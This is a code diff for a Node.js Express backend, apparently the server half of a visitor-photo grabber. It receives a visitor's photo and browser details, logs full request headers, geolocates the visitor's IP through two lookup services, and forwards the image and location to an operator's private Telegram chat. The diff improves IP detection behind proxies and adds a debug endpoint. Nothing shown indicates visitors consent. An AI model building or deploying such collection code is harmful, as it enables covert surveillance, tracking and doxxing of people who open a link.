@@ -1,8 +1,8 @@
 const express = require('express');
 const cors = require('cors');
 const axios = require('axios');
-const FormData = require('form-data');
 require('dotenv').config();
+const FormData = require('form-data');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -11,35 +11,82 @@ const PORT = process.env.PORT || 3000;
 app.use(cors());
 app.use(express.json({ limit: '10mb' }));
 
+// Enable proxy trust (important for Render)
+app.set('trust proxy', true);
+
 // Telegram configuration
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_USER_ID = process.env.TELEGRAM_USER_ID;
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
 
-// Function to get client IP
+// Function to get client IP - IMPROVED VERSION
 function getClientIP(req) {
-    return req.ip ||
-        req.connection.remoteAddress ||
-        req.socket.remoteAddress ||
-        (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
-        'Unknown';
+    // For Render.com or other proxies
+    const forwardedFor = req.headers['x-forwarded-for'];
+    if (forwardedFor) {
+        const ips = forwardedFor.split(',');
+        return ips[0].trim();
+    }
+    
+    // For other headers
+    const realIP = req.headers['x-real-ip'];
+    if (realIP) return realIP;
+    
+    // For CF
+    const cfConnectingIP = req.headers['cf-connecting-ip'];
+    if (cfConnectingIP) return cfConnectingIP;
+    
+    // Default Express IP (might be local when testing)
+    return req.ip || 
+           req.connection?.remoteAddress || 
+           req.socket?.remoteAddress ||
+           (req.connection?.socket ? req.connection.socket.remoteAddress : null) ||
+           'Unknown';
 }
 
-// Function to get IP info from ipinfo.io
+// Function to get IP info - FIXED VERSION
 async function getIPInfo(ip) {
-    try {
-        const response = await axios.get(`https://ipinfo.io/${ip}/json`);
-        return response.data;
-    } catch (error) {
-        console.error('Error fetching IP info:', error.message);
+    // Don't query ipinfo.io for localhost IPs
+    if (ip === '::1' || ip === '127.0.0.1' || ip === 'localhost') {
         return {
             ip: ip,
-            city: 'Unknown',
-            region: 'Unknown',
-            country: 'Unknown',
-            org: 'Unknown',
-            timezone: 'Unknown'
+            city: 'Localhost',
+            region: 'Local Network',
+            country: 'Local',
+            org: 'Local Development',
+            timezone: 'Local'
         };
+    }
+    
+    try {
+        const response = await axios.get(`https://ipinfo.io/${ip}/json?token=${process.env.IPINFO_TOKEN || ''}`);
+        return response.data;
+    } catch (error) {
+        console.warn('Failed to fetch IP info from ipinfo.io:', error.message);
+        
+        // Fallback: Try another IP service
+        try {
+            const response = await axios.get(`http://ip-api.com/json/${ip}`);
+            const data = response.data;
+            return {
+                ip: ip,
+                city: data.city || 'Unknown',
+                region: data.regionName || 'Unknown',
+                country: data.country || 'Unknown',
+                org: data.isp || 'Unknown',
+                timezone: data.timezone || 'Unknown'
+            };
+        } catch (fallbackError) {
+            console.warn('Failed to fetch IP info from fallback service:', fallbackError.message);
+            return {
+                ip: ip,
+                city: 'Unknown',
+                region: 'Unknown',
+                country: 'Unknown',
+                org: 'Unknown',
+                timezone: 'Unknown'
+            };
+        }
     }
 }
 
@@ -58,13 +105,17 @@ async function sendTelegramMessage(message) {
     }
 }
 
-// Function to send photo to Telegram
+// Function to send photo to Telegram - FIXED VERSION
 async function sendTelegramPhoto(photoBuffer, caption = '') {
     try {
+        // For Node.js environment, we need to use Buffer directly with form-data
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_USER_ID);
-        formData.append('photo', photoBuffer, { filename: 'user_photo.jpg' });
-        formData.append('caption', caption.substring(0, 1024)); // Telegram caption limit
+        formData.append('photo', photoBuffer, {
+            filename: 'user_photo.jpg',
+            contentType: 'image/jpeg'
+        });
+        formData.append('caption', caption.substring(0, 1024));
 
         const response = await axios.post(`${TELEGRAM_API_URL}/sendPhoto`, formData, {
             headers: {
@@ -74,12 +125,15 @@ async function sendTelegramPhoto(photoBuffer, caption = '') {
         return response.data;
     } catch (error) {
         console.error('Error sending Telegram photo:', error.response?.data || error.message);
-        
-        // If photo fails, try sending as document
+
+        // Try sending as document if photo fails
         try {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_USER_ID);
-            formData.append('document', photoBuffer, { filename: 'user_photo.jpg' });
+            formData.append('document', photoBuffer, {
+                filename: 'user_photo.jpg',
+                contentType: 'image/jpeg'
+            });
             formData.append('caption', caption.substring(0, 1024));
 
             const response = await axios.post(`${TELEGRAM_API_URL}/sendDocument`, formData, {
@@ -99,18 +153,22 @@ async function sendTelegramPhoto(photoBuffer, caption = '') {
 app.post('/api/user-data', async (req, res) => {
     try {
         const { photo, additionalInfo = {} } = req.body;
-        const clientIP = getClientIP(req);
+        let clientIP = getClientIP(req);
 
         console.log('Received user data from IP:', clientIP);
+        console.log('Headers:', req.headers);
 
         if (!photo) {
             return res.status(400).json({ error: 'No photo data provided' });
         }
 
-        // Get IP information
-        const ipInfo = await getIPInfo(clientIP.replace('::ffff:', '')); // Remove IPv6 prefix if present
+        // Clean IP address (remove IPv6 prefix, etc.)
+        clientIP = clientIP.replace('::ffff:', '').replace('::1', '127.0.0.1');
 
-        // Extract base64 data from data URL if it's a data URL
+        // Get IP information
+        const ipInfo = await getIPInfo(clientIP);
+
+        // Extract base64 data from data URL
         let photoBuffer;
         if (photo.startsWith('data:image')) {
             const base64Data = photo.replace(/^data:image\/\w+;base64,/, '');
@@ -145,8 +203,11 @@ ${additionalInfo.language ? `🗣️ <b>Language:</b> ${additionalInfo.language}
         // Send info message to Telegram
         await sendTelegramMessage(infoMessage);
 
+        // Create photo caption
+        const photoCaption = `User photo from ${ipInfo.city !== 'Unknown' ? ipInfo.city + ', ' : ''}${ipInfo.country !== 'Unknown' ? ipInfo.country : ipInfo.ip}`;
+
         // Send photo to Telegram
-        await sendTelegramPhoto(photoBuffer, `User photo from ${ipInfo.city}, ${ipInfo.country}`);
+        await sendTelegramPhoto(photoBuffer, photoCaption);
 
         console.log('User data sent to Telegram successfully');
         res.json({ 
@@ -164,16 +225,24 @@ ${additionalInfo.language ? `🗣️ <b>Language:</b> ${additionalInfo.language}
     }
 });
 
-// Endpoint to get IP info directly
-app.get('/api/ipinfo', async (req, res) => {
-    try {
-        const clientIP = getClientIP(req);
-        const ipInfo = await getIPInfo(clientIP.replace('::ffff:', ''));
-        res.json(ipInfo);
-    } catch (error) {
-        console.error('Error getting IP info:', error);
-        res.status(500).json({ error: 'Failed to get IP information' });
-    }
+// Endpoint to test IP detection
+app.get('/api/myip', (req, res) => {
+    const clientIP = getClientIP(req);
+    const headers = req.headers;
+    
+    res.json({
+        ip: clientIP,
+        headers: {
+            'x-forwarded-for': headers['x-forwarded-for'],
+            'x-real-ip': headers['x-real-ip'],
+            'cf-connecting-ip': headers['cf-connecting-ip']
+        },
+        rawIp: req.ip,
+        connection: {
+            remoteAddress: req.connection?.remoteAddress,
+            socketRemoteAddress: req.socket?.remoteAddress
+        }
+    });
 });
 
 // Health check endpoint
@@ -191,7 +260,7 @@ app.get('/', (req, res) => {
         message: 'Telegram Photo Bot Backend is running',
         endpoints: {
             '/api/user-data': 'POST - Receive user photo and IP',
-            '/api/ipinfo': 'GET - Get IP information',
+            '/api/myip': 'GET - Test IP detection',
             '/health': 'GET - Health check'
         }
     });
